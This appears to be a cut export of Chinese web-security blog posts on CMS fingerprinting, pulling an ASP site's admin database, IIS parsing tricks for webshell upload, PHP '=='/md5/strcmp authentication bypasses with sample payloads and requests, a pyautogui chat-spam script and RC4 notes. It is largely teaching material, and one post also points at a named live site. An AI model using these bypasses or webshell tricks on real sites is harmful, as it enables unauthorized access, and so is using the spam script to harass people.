&emsp;&emsp;生成该文件的md5值：certutil -hashfile favico.ico md5 &emsp;&emsp;在字典中查询md5值，发现有记录，该CMS对应的是metinfo，正确 &emsp;&emsp;字典链接：https://github.com/Lucifer1993/cmsprint 六、开源或内部&emsp;&emsp;开源：去网上找寻漏洞文章。直接找漏洞或审计（可以通过CMS识别出来的） &emsp;&emsp;内部：常规的渗透测试，用扫描工具去判断。（找不到源码或者不知道对方的CMS名称） 七、源码获取 扫描工具探测备份文件 CMS识别技术获取CMS名称然后从网上下载 百度直接搜索：源码 咸鱼上会有卖 第三方源码站：比如菜鸟源码 各种行业对应 八、总结&emsp;&emsp;关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。 九、演示案例1、ASP,PHP 等源码下安全测试&emsp;&emsp;平台识别-某 CMS 无漏洞-默认数据库 &emsp;&emsp;平台识别-某 CMS 有漏洞-漏洞利用 （1）xycms搬家公司登入后台 &emsp;&emsp;访问该网站，随便点点，观察URL可知，该网站应该是用asp语言做的 &emsp;&emsp;同时可以看到该网站的CMS为xycms &emsp;&emsp;搜索XYCMS源码，下载 &emsp;&emsp;打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件) &emsp;&emsp;该文件存有管理员的账号密码 &emsp;&emsp;根据下载的源码路径，可以去尝试访问网站的目录： http://192.168.1.105:8003/xydata/xycms.mdb,下载到文件 &emsp;&emsp;尝试访问到后台 &emsp;&emsp;数据库中admin数据 密码MD5解密 &emsp;&emsp;使用用户密码即可登录 2、源码应用分类下的针对漏洞（1） niushop电商类关注漏洞点-业务逻辑&emsp;&emsp;买东西时，数量为一，提交的时候抓包，将数量改为-1，数量不可能为-1，因此白嫖 3、简要目标从识别到源码获取（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析&emsp;&emsp;比如这个博客，复制到获取的某些文件的路径到搜索引擎中搜索，可以知道该网站的CMS为ZBlog （2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试&emsp;&emsp;http://weipan.1016sangshen.cn/ 内部搭建的靶场 &emsp;&emsp;这是最近一个非法网站币圈的网站，是真实的，这套源码都还有其他人在用 &emsp;&emsp;可以看到为ThinkPhp &emsp;&emsp;将URL放入工具中，存在漏洞，后续针对漏洞进行攻击即可 &emsp;&emsp;利用搜索引擎搜索该网站URL一栏上的：index/login/login/token &emsp;&emsp;这个就是跟之前的模板一模一样的，放入工具中，存在漏洞 &emsp;&emsp;这个也是 （3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他&emsp;&emsp;菜鸟源码中，搜索微盘，就有好多这种模板的源码 &emsp;&emsp;闲鱼 十、其他&emsp;&emsp;Github监控器：https://github.com/M4tir/Github-Monitor &emsp;&emsp;大佬的博客：https://websec.readthedocs.io/zh/latest/language/index.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Web搭建安全拓展","slug":"Web搭建安全拓展","date":"2021-12-13T10:41:12.000Z","updated":"2022-01-03T03:30:20.257Z","comments":true,"path":"post/ec694927.html","link":"","permalink":"https://wolke.cn/post/ec694927.html","excerpt":"","text":"一、常见搭建平台脚本启用&emsp;&emsp;ASP，PHP，ASPX，JSP，PY，JAVAWEB等环境 二、域名IP目录解析安全问题1、介绍&emsp;&emsp;IP地址访问可以发现更多的信息同时经常能找到程序源码备份文件和敏感信息，而域名访问只能发现一个文件夹下的所有文件。 &emsp;&emsp;网站搭建的时候支持IP访问和域名访问，域名访问的时候一般只会指向某个目录，IP访问的时候指向的是根目录。 2、实验分析（1）实验环境搭建&emsp;&emsp;在根目录下创建一个index.html &lt;html&gt;&lt;body&gt;&lt;center&gt;这是&lt;strong&gt;根目录&lt;/strong&gt;下的网页&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;在根目录下创建一个名为wnd的文件夹，里面写一个index.html &lt;html&gt;&lt;body&gt;&lt;center&gt;这是&lt;strong&gt;wnd目录&lt;/strong&gt;下的网页&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;将域名wnd198.com绑定到wnd文件夹 &emsp;&emsp;利用ipconfig查看到本机IP为192.168.1.104，修改hosts文件，增加一条解析 （2）验证和结果分析&emsp;&emsp;访问wnd198.com，访问的是wnd目录下的文件 &emsp;&emsp;直接访问IP地址192.168.1.104，访问的是根目录的文件 三、部署IIS1、安装IIS&emsp;&emsp;安装IIS之web插件，插入光盘–找到IIS–WEB(应用程序服务器–Internet信息服务） &emsp;&emsp;出现这种情况把D改成E即可。因为之前我安装虚拟机的时候强制把D盘符给了硬盘，把光盘设置为E盘，所以按安装程序还以为光盘在D盘所以找不到文件因此冒出提示 &emsp;&emsp;安装完成，可以在这里看到 2、验证安装情况&emsp;&emsp;安装完毕，使用netstat -an验证TCP/80端口是否打开！此时80已经打开，且IIS自带了一个发布好的网站，称之为默认网站！ &emsp;&emsp;IIS自带的默认网站路径：c:\\Inetpub\\wwwroot。此时建议停止默认网站！ &emsp;&emsp;停止默认网站后，可以发现TCP 80端口号也不见了，因此可以知道80端口号开放了那么web服务器一定有一个以上的网站。用xp再次访问10.1.1.1，显示如下错误，这是因为最后一个网站都停用了，那TCP 80端口号就关闭了 3、新建网站&emsp;&emsp;新建一个flower的网站，并在网站目录下新建一个index.html文件并将该html在文档一栏中设置为默认文档 #index.html源码&lt;html&gt;&lt;body&gt;&lt;center&gt;&lt;strong&gt;Welcome to my flowers store&lt;/strong&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;访问成功 四、常见文件后缀解析对应安全&emsp;&emsp;指定后缀名对应某个文件，访问网站出现遇到不能解析的文件就是中间件可能默认或者添加某些设置导致解析时出现问题。 实验（1）实验准备&emsp;&emsp;从网站上随便找了个asp网站源码，先按照使用手册的要求进行相关设置 &emsp;&emsp;对网站根目录下的Nzcms_nzweb文件夹添加everyone用户，写入权限 &emsp;&emsp;开通IIS父路径 &emsp;&emsp;IIS设置执行权限（纯脚本） &emsp;&emsp;如果执行权限为无，那么当访问http://本机IP/nz0808/index.asp，发现错误，报错信息为无法运行脚本，说明没有运行的权限 &emsp;&emsp;添加index.asp文档名称 &emsp;&emsp;IIS里的WEB服务器扩展设置 &emsp;&emsp;访问成功 （2）进行实验&emsp;&emsp;当我们访问：http://192.168.43.77/index.asp时，正常成功访问 &emsp;&emsp;当我们访问：http://192.168.43.77/index.haha123时，找不到网页，正常，因为网站根本没有这个文件 &emsp;&emsp;将index.asp重命名为index.haha123后，再次访问http://192.168.43.77/index.haha123，还是不行，因为无法解析后缀名为haha123的文件 &emsp;&emsp;添加一个haha123的文件后缀解析规则，将haha123后缀解析为asp &emsp;&emsp;再次访问：http://192.168.43.77/index.haha123时，成功解析打开 （3）实验总结&emsp;&emsp;在实验准备的过程中，有一步是增加了Everyone用户并对其进行权限设置，在很多时候比如用菜刀连接一句话木马的时候，会发现只看的到当前网站目录访问不到别的目录；或者是只能看文件但是不能修改文件；这些都可能是设置了目录的用户权限 &emsp;&emsp;在实验准备的过程中，有一步是设置执行权限为纯脚本，假如为无那么将运行不了脚本文件，因此有的时候即使上传了一句话木马但是发现连接不上很可能是因为执行权限不够。但是一般情况下，考虑到网站运行，都会允许脚本运行 &emsp;&emsp;在实验时发现，只要解析规则上有，就可以解析相关的后缀文件。因此假如一句话木马不允许上传PHP文件，但是解析规则又能解析php3为php文件，那么可以上传php3后缀的木马文件进行绕过。 五、常见安全测试中的安全防护 企业内网会限制外部人员访问内部的网站，限制IP地址，规范访问者的权限 身份验证和访问控制，基于用户的限制 限制IP地址的访问，授权访问-只允许指定IP地址可以访问。 拒绝访问-指定IP地址拒绝访问 六、Web目录中敏感文件 后台路径 配置文件 备份文件 七、Web后门与用户及文件权限 设置相关权限，禁止来宾用户的权限，导致连接的后门看不到任何东西，它属于防护技巧，同时也是测试里经常碰到的问题 设置了执行权限，没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用 绕过思路： a. 将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面 八、基于中间件的简要识别&emsp;&emsp;通过抓取数据包的返回结果，查询搭建平台信息 九、基于中间件的安全漏洞&emsp;&emsp;https://www.freebuf.com/articles/web/192063.html &emsp;&emsp;web中间件常见漏洞总结.pdf 十、搭建Vulhub靶场1、下载&emsp;&emsp;Vulhub官网：https://vulhub.org/vulhub 2、安装 官方推荐用Ubuntu来安装 安装常用软件： apt是Ubuntu的一个更新源apt-get update:更新软件列表apt-get install:安装命令apt-get install ssh：安装ssh服务apt-get install vim：安装vim编辑器 开启ssh服务（查看状态已经开启过了）：systemctl status ssh 或者 service ssh status 安装curl：sudo apt-get install curl 安装Docker：curl -s https://get.docker.com/ | sh 查看docker是否安装成功：docker -v 安装docker-compose（没有pip命令先安装Python：apt-get install python3-pip）命令：pip install docker-compose 检查是否安装成功：docker-compose -v 下载Vulhub（不能执行Git命令的先安装Git，命令：apt-get install git）命令：git clone https://github.com/vulhub/vulhub.git 将下载好的vulhub移至local文件夹：mv vulhub /usr/local 安装成功，进入目录 3、启动环境 进入漏洞环境目录：cd tomcat/tomcat8/ 执行命令：docker-compose builddocker-compose up -d 安装完成 打开官网，根据官方文档来操作 复现之后即可关闭：docker-compose down 完成","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"PHP检查相等时的漏洞","slug":"PHP检查相等时的漏洞","date":"2021-12-12T16:21:18.000Z","updated":"2022-01-03T03:29:07.160Z","comments":true,"path":"post/a645df71.html","link":"","permalink":"https://wolke.cn/post/a645df71.html","excerpt":"","text":"一、PHP弱类型==的漏洞1、原理注：这些漏洞适用于所有版本的PHP &emsp;&emsp;先来复习一下基本的语法：php中有如下两种比较符号：两个等号和三个等号（这一点和Javascript）有些类似 $a==$b$a===$b &emsp;&emsp;我们来一下php官方手册的说法 如果类型转换后 $a 等于 $b，则 $a == $b 等于 TRUE。如果 $a 等于 $b，并且它们的类型也相同，则 $a === $b 全等 TRUE。 &emsp;&emsp;明确的看到，两个等于号的等于会在比较的时候进行类型转换的比较 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对. &emsp;&emsp;明确的写出了，如果一个数值和一个字符串比较，那么会将字符串转换为数值（而不是相反，将数值转化为字符串） &emsp;&emsp;然而，php是如何将一个字符串转化为数值的呢，我们继续查看php手册 当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含 ‘**.’，’e’ 或 ‘E’ 并且其数字值在整型的范围之内（由 PHP_INT_MAX 所定义），该字符串将被当成 integer 来取值。其它所有情况下都被作为 float 来取值。该字符串的开始部分决定了它的值**。如果该字符串以合法的数值开始，则使用该数值。否则其值为 0（零）。合法数值由可选的正负号，后面跟着一个或多个数字（可能有小数点），再跟着可选的指数部分。指数部分由 ‘e’ 或 ‘E’ 后面跟着一个或多个数字构成。 &emsp;&emsp;这是官方手册上面的几个例子 &lt;?php$foo = 1 + &quot;10.5&quot;; // $foo is float (11.5)$foo = 1 + &quot;-1.3e3&quot;; // $foo is float (-1299)$foo = 1 + &quot;bob-1.3e3&quot;; // $foo is integer (1)$foo = 1 + &quot;bob3&quot;; // $foo is integer (1)$foo = 1 + &quot;10 Small Pigs&quot;; // $foo is integer (11)$foo = 4 + &quot;10.2 Little Piggies&quot;; // $foo is float (14.2)$foo = &quot;10.0 pigs &quot; + 1; // $foo is float (11)$foo = &quot;10.0 pigs &quot; + 1.0; // $foo is float (11) ?&gt; 我们大概可以总结出如下的规则：当一个字符串被转换为数值时 如果一个字符串为 “合法数字+e+合法数字”类型，将会解释为科学计数法的浮点数 如果一个字符串为 “合法数字+ 不可解释为合法数字的字符串”类型，将会被转换为该合法数字的值，后面的字符串将会被丢弃 如果一个字符串为“不可解释为合法数字的字符串+任意”类型，则被转换为0！ 为0…为0 &lt;?php&#x27;a&#x27;==0 // true&#x27;12a&#x27;==12 //true&#x27;1&#x27;==1 //true&#x27;1aaaa55sss66&#x27;==1 //true &emsp;&emsp;当然，上面的那些等式对于===都是false的，原本一些应该用===的地方误用了==，导致了可以注入的地方。 2、示例代码1：利用转为数字后相等的漏洞&lt;?php if (isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;])) &#123; $logined = true; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if (!ctype_alpha($v1)) &#123;$logined = false;&#125; //ctype_alpha函数检查提供的字符串，文本中的所有字符是否都是字母，是则返回True，否则返回False，因此这里要全是字母 if (!is_numeric($v2) ) &#123;$logined = false;&#125; //如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，因此必须包含且只能包含数字/数字字符串 if (md5($v1) != md5($v2)) &#123;$logined = false;&#125;//如果md5值不相等，则返回True，因此这里要返回相等的md5 if ($logined)&#123; // continuue to do other things &#125; else &#123; echo &quot;login failed&quot; &#125; &#125;? &emsp;&emsp;这是一个CTF的题目，非常有趣，可以看到，要求给出两字符串，一个是纯数字型，一个只能出现字符，使两个的md5哈希值相等，然而这种强碰撞在密码学上都是无法做到的。但是我们看到，最终比较两者的哈希的时候，使用的是等于 而不是 全等于 ，因此可以利用一下这个漏洞 &emsp;&emsp;再回头看一 md5()函数 string md5 ( string $str [, bool $raw_output = false ] ) &emsp;&emsp;可以知道，第二个参数为true的时候，显示16位的结果，而为false和没有第二个参数时，为32位的16进制码（16位的结果是把32位的作为ASCII码进行解析） &emsp;&emsp;16进制的数据中是含有e的，可以构建使得两个数字比较的，这里有一个现成的例子： md5(&#x27;240610708&#x27;) //0e462097431906509019562988736854.md5(&#x27;QNKCDZO&#x27;) //0e830400451993494058024219903391 &emsp;&emsp;可以看到，这两个字符串一个只包含数字，一个只包含字母，虽然两个的哈希不一样，但是都是一个形式：0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。 &emsp;&emsp;转换后都成为了0的好多好多次方，都是0，相等。（大家可以自己尝试一下）因此 md5(&#x27;240610708&#x27;)==md5(&#x27;QNKCDZO&#x27;); //Truemd5(&#x27;240610708&#x27;)===md5(&#x27;QNKCDZO&#x27;); //False 用===可以避免这一漏洞。 3、示例代码2: 利用 类’a’==0的漏洞&lt;?php if (isset($_POST[&#x27;json&#x27;])) &#123; $json = json_decode($_POST[&#x27;json&#x27;]); $key =&quot;**********************&quot;; if ($json-&gt;key == $key) &#123; //login success ,continue &#125; else &#123; //login failed ，return &#125;?&gt; &emsp;&emsp;这次这个例子是传入一个JSON的数据，JSON在RESTful的网站中是很常用的一种数据传输的格式。这个表单会把一个name为key的input的数据作为json传到服务端 &#123;&quot;key&quot;:&quot;your input&quot;&#125; &emsp;&emsp;我们该如何破解？想”a”==0这个漏洞，之用我们使$json-&gt;key是一个数字类型的变量就可以，怎么做到呢？ &emsp;&emsp;php的json_decode()函数会根据json数据中的数据类型来将其转换为php中的相应类型的数据，也就是说，如果我们在json中传一个string类型，那么该变量就是string，如果传入的是number，则该变量为number。因此，我们如果传入一个数字，就可以使之相等。网页中的表单可能限制了所有的输入都是string，即使输入数字，传入的东西也是 &#123;&quot;key&quot;:&quot;0&quot;&#125; &emsp;&emsp;这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样即可： &#123;&quot;key&quot;:0&#125; &emsp;&emsp;值得讨论的一点是，在这种方法的漏洞利用中，很难在直接表单类型的POST的数据中使用，这是为什么呢，这个和HTTP协议有关。首先，我们看一下，在POST给服务器的数据中，有几种类型，也就是HTTP header中的Content-Type： application/x-www-form-urlencodedmultipart/form-dataapplication/jsonapplication/xml &emsp;&emsp;第一个application/x-www-form-urlencoded，是一般表单形式提交的。content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的 &emsp;&emsp;但是因为在直接的POST的payload当中是无法区分字符串和数字的，因为在其中并没有引号出现，举一个抓包的例子 POST /login HTTP/1.1Host: xxx.comContent-Length: 41Accept: application/json, text/javascript,application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Connection: closeusername=admin&amp;password=admin &emsp;&emsp;可以看到，payload是放在http包的最后面的，而且都是以没有引号的形式传递的，并没有办法区分到底是字符串还是数字。因此，PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了。而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。 二、md5()漏洞1、数组绕过&emsp;&emsp;md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 2、利用==漏洞绕过&emsp;&emsp;利用==比较漏洞：如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的 &emsp;&emsp;下列的字符串的MD5值都是0e开头的： QNKCDZO240610708s878926199as155964671as214587387as214587387a0e开头的md5和原值：s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 三、strcmp漏洞注：这一个漏洞适用与5.3之前版本的php &emsp;&emsp;我们首先看一下这个函数,这个函数是用于比较字符串的函数 int strcmp ( string $str1 , string $str2 ) &emsp;&emsp;参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 &emsp;&emsp;可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本php的网站进行渗透测试。看一段示例代码： &lt;?php $password=&quot;***************&quot; if(isset($_POST[&#x27;password&#x27;]))&#123; if (strcmp($_POST[&#x27;password&#x27;], $password) == 0) &#123; echo &quot;Right!!!login success&quot;;n exit(); &#125; else &#123; echo &quot;Wrong password..&quot;; &#125;?&gt; &emsp;&emsp;对于这段代码，我们能用什么办法绕过验证呢， 只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢。 &emsp;&emsp;其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key），当作一个名字为xxx的数组构造类似如下的request POST /login HTTP/1.1Host: xxx.comContent-Length: 41Accept: application/json, text/javascriptUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Connection: closepassword[]=admin &emsp;&emsp;即可使得上述代码绕过验证成功。 四、总结&emsp;&emsp;这一类型的漏洞的特点主要就是利用PHP中 的类型特性来绕过验证。由于 == 和 === 有着明显的区分，因此，估计短期内PHP的作者并不会调整对于这两个符号的策略。而对于开发市场而言，随着培训机构的增多，后端程序员尤其是php后端程序员的门槛越来越低，其水平必定也是良莠不齐，这些二把刀程序员可能带来更多的此类对于特性的不当使用导致的漏洞，因此这类漏洞仍然是非常具有利用价值的。 &emsp;&emsp;记住保证安全的几句箴言：任何用户输入都是不可信的！对于web应用来说，前端（浏览器端）的安全限制只能起到防止一般用户的误输入行为，完全不可能对于黑帽子的行为有任何的防御作用 &emsp;&emsp;因此，在防御这个漏洞的过程中，保证几件事情： 在所有可能的地方，都使用===来代替== 对于用户输入做过滤和类型检查 尽量使用新版本的php，apache 基本上就可以完美的防御这一类的漏洞。 &emsp;&emsp;而对于渗透测试人员，在代码审计的过程中，对于有==，strcmp的比较也应极为敏感 。在黑盒渗透的时候也可以对于代码进行猜测，结合信息搜集过程中的一些版本特性，利用这些漏洞来绕过验证。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/tags/PHP/"}],"author":"w01ke"},{"title":"PHP的$GLOBALS数组","slug":"PHP的$GLOBALS数组","date":"2021-12-12T14:04:04.000Z","updated":"2021-12-12T16:38:34.184Z","comments":true,"path":"post/b7832a6b.html","link":"","permalink":"https://wolke.cn/post/b7832a6b.html","excerpt":"","text":"$GLOBALS —— 引用全局作用域中可用的全部变量。 说明：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 示例： #示例代码&lt;?phpfunction test() &#123; $foo = &quot;local variable&quot;; echo &#x27;$foo in global scope: &#x27; . $GLOBALS[&quot;foo&quot;] . &quot;\\n&quot;; echo &#x27;$foo in current scope: &#x27; . $foo . &quot;\\n&quot;;&#125;$foo = &quot;Example content&quot;;test();?&gt;#结果$foo in global scope: Example content$foo in current scope: local variable 注意： “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 global $variable; 来访问它。 变量可用性。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。 代码分析 页面如下 其中正则表达式/^\\w+$/，意思是只能有字母和数字 两个//表示开始和结束 ^表示开始字符串 $表示结束字符串 \\w表示包含【a-z，A-Z, _ , 0-9】 +表示一个或者多个\\w 后面的i表示不区分大小写，在此处没用，因为\\w里已经包含了大小写。 访问 http://114.67.246.176:12610/?args=GLOBALS，看到flag","categories":[{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/tags/PHP/"}],"author":"w01ke"},{"title":"Python实现消息轰炸机","slug":"Python实现消息轰炸机","date":"2021-12-12T13:17:22.000Z","updated":"2022-01-03T03:29:24.171Z","comments":true,"path":"post/5ab8ed9d.html","link":"","permalink":"https://wolke.cn/post/5ab8ed9d.html","excerpt":"","text":"&emsp;&emsp;解放双手，让电脑来帮我们自动发一些我们想要发的消息，挺省力的，比如说我们想恶搞好朋友，那么我们就可以用脚本来实现自动复制、粘贴和发送文字的功能，从而解放我们自己，不用亲自在电脑上反复干这个Ctrl C/Ctrl V这个累活儿。 &emsp;&emsp;还可以把定时多长时间后发送指定内容，这下子就不用坐在电脑前面到点了发弹幕了。 第一步：获取聊天窗口位置&emsp;&emsp;在我们发消息之前，得需要知道聊天窗口的位置在哪，即鼠标停留在哪里才能定位到聊天窗口的输入界面，也就是鼠标的x和y坐标是多少。 import osimport timeimport pyautogui as pagtry: while True: print(&quot;Press Ctrl-C to stop&quot;) x, y = pag.position() positionStr = &quot;(&quot; + str(x).rjust(4) + &quot;,&quot; + str(y).rjust(4) + &quot;)&quot; print(positionStr) time.sleep(0.2) os.system(&#x27;cls&#x27;)except KeyboardInterrupt: print(&#x27;end...&#x27;) &emsp;&emsp;只要程序运行起来之后，每当我们移动鼠标，鼠标的x和y值就会自动发生改变并打印出来，我们只需要把聊天窗口调出来，把鼠标定位到聊天的窗口的输入位置就能获取到此时的x和y值。 第二步：实现自动发送消息import timeimport pyautoguiimport pyperclipcontent = &quot;&quot;&quot;我爱你&quot;&quot;&quot;for line in list(content.split(&quot;\\n&quot;))*10:#发送10次文本 if line: pyautogui.click(801, 730) #鼠标点击并定位到聊天窗口 pyperclip.copy(line) #复制该行 pyautogui.hotkey(&quot;ctrl&quot;,&quot;v&quot;) #粘贴，mac电脑则把ctrl换成command pyautogui.typewrite(&quot;\\n&quot;) #发送 time.sleep(0.1) #每次发完间隔0.1s &emsp;&emsp;先运行第一步的代码确定坐标，然后运行第二步实施自动发送 改良版Github：https://github.com/LeeJony000/Message_bomber","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://wolke.cn/tags/%E7%88%AC%E8%99%AB/"}],"author":"w01ke"},{"title":"RC4加密算法","slug":"RC4加密算法","date":"2021-12-12T12:50:09.000Z","updated":"2022-11-13T07:25:36.659Z","comments":true,"path":"post/9dd1bdb.html","link":"","permalink":"https://wolke.cn/post/9dd1bdb.html","excerpt":"","text":"&emsp;&emsp;RC4加密算法是一种对称加密算法 一、对称加密算法&emsp;&emsp;对称加密(也叫私钥加密)指加密和解密使用相同密钥的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。 二、RC4加密算法1、预备知识（1）异或&emsp;&emsp;学习RC4加密算法之前，首先要知道：对明文使用同一个密钥异或两次最后是得到原文的 （2）流密码① 定义&emsp;&emsp;流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。 &emsp;&emsp;流密码类似于“一次一密”，不同的是“一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。 ② 实例&emsp;&emsp;使用最广泛的流密码是RC4 ③ 流密码结构 ④ 设计流密码的主要因素 加密序列的周期要长，若出现重复的周期过短，容易被破解 密钥流应该尽可能地接近真正随机数流的特征 密钥长度要长，以避免穷举攻击 2、RC4算法介绍&emsp;&emsp;RC4算法是Ron Rivest为RSA公司在1987年设计的一种流密码，作为RSA的商业机密直到1994年才被匿名公布于Internet。 &emsp;&emsp;该算法是一个可变密钥长度、面向字节操作的流密码。该算法以随机置换作为基础，其密码周期很可能大于10100，且该算法的运行速度很快。 &emsp;&emsp;RC4被用于为网络浏览器和服务器间通信而制定的SSL/TLS（安全套接字协议/传输层安全协议）标准中，以及作为IEEE 801.11无线局域网标准一部分的WEP(Wired Equivalent Privacy)协议和新的WiFi受保护访问协议（WPA）中。从这些应用来看，RC4构成了当今网络通信的非常重要的部分，因此这个算法非常重要。 &emsp;&emsp;RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。 3、RC4加密原理 &emsp;&emsp;RC4算法的原理很简单，包括初始化算法（KSA）和**伪随机子密码生成算法（PRGA)**两大部分。 （1）初始化算法（KSA）① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）&emsp;&emsp;按照升序，给每个字节赋值0,1,2,3,4,5,6……,254,255 ② 初始密钥（由用户输入），长度任意&emsp;&emsp;建立一个临时向量T。将密钥的值循环复制到T向量如果输入长度小于256个字节，则进行轮转，直到填满 例如输入密钥的是1,2,3,4,5，那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5…… &emsp;&emsp;由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2） ③ 开始对状态向量S进行置换操作（用来打乱初始种子1）&emsp;&emsp;按照下列规则进行，从第零个字节开始，执行256次，保证每个字节都得到处理 j=0;for(i=0;i&lt;256;i++)&#123; j = (j + S[i] + T[i]) mod 256; swap(S[i],S[j]); &emsp;&emsp;因为对S的操作仅是交换，S仍然包含所有值为0-255的元素。 （3）密钥流的生成与加密&emsp;&emsp;假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节） i=0;j=0;while(datalength--)&#123; // 